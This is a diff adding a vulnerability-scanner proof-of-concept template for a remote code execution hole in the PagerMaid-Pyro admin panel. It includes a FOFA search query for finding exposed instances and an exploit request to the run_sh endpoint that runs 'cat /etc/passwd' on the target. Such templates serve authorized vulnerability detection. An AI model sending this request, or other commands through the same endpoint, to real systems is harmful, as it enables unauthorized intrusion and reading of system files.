@@ -1,0 +1,18 @@
+id: poc-yaml-pagermaid-pyro-bms-run-sh-rce
+info:
+  name: PagerMaid-Pyro后台管理系统 run_sh 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: PagerMaid-Pyro后台管理系统
+  fofa: title="PagerMaid-Pyro" && body="href=\"https://xtaolabs.com/pagermaid-logo.png\""
+requests:
+- method: GET
+  path: /admin
+  expression: status_code == 200 && contains(body,"PagerMaid-Pyro 后台管理")
+- method: GET
+  path: /pagermaid/api/run_sh?cmd=cat%20/etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
